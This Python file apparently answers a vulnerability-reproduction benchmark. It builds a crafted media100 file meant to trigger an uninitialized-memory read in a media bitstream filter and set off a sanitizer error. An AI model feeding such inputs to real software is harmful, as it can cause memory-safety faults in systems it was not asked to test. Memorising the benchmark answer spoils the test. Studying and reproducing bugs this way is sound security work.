import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept for an uninitialized value vulnerability
        in the media100_to_mjpegb bitstream filter.

        The PoC is a minimal media100 format file. This file will be demuxed,
        and its single video frame will be passed through the vulnerable
        media100_to_mjpegb bitstream filter.

        The filter allocates an output buffer for the transformed packet but
        fails to initialize the padding area at the end of the buffer. The size
        of the packet is chosen such that a subsequent processing
        step (like an AVI muxer) is likely to read past the end of the valid
        data and into the uninitialized padding, triggering a sanitizer error.

        The file structure is as follows:
        - A 62-byte media100 header.
        - A 4-byte packet size.
        - The packet data itself.

        The total size is 1025 bytes, matching the ground-truth PoC.
        """
        total_size = 1025
        header_size = 62
        header = bytearray(header_size)

        # Magic number 'M100', read as a little-endian 32-bit integer.
        # The bytes 'M','1','0','0' are read as 0x3030314d, matching the check.
        header[0:4] = b'M100'

        # All subsequent fields in the header are read as big-endian.
        # Version (u16)
        struct.pack_into('>H', header, 4, 1)
        # Header size (u32)
        struct.pack_into('>I', header, 6, header_size)
        # Timescale (u32)
        struct.pack_into('>I', header, 10, 30000)
        # Frames per second (u32)
        struct.pack_into('>I', header, 14, 1001)
        # Number of frames (u32)
        struct.pack_into('>I', header, 18, 1)
        # Width (u32)
        struct.pack_into('>I', header, 34, 16)
        # Height (u32)
        struct.pack_into('>I', header, 38, 16)
        
        # The packet consists of a 4-byte size and the payload.
        packet_payload_size = total_size - header_size - 4  # 1025 - 62 - 4 = 959

        # Packet size (big-endian u32)
        packet_size_field = struct.pack('>I', packet_payload_size)

        # Packet payload (content is irrelevant for this vulnerability).
        packet_payload = b'\x00' * packet_payload_size

        # Assemble the final PoC.
        poc = bytes(header) + packet_size_field + packet_payload
        
        return poc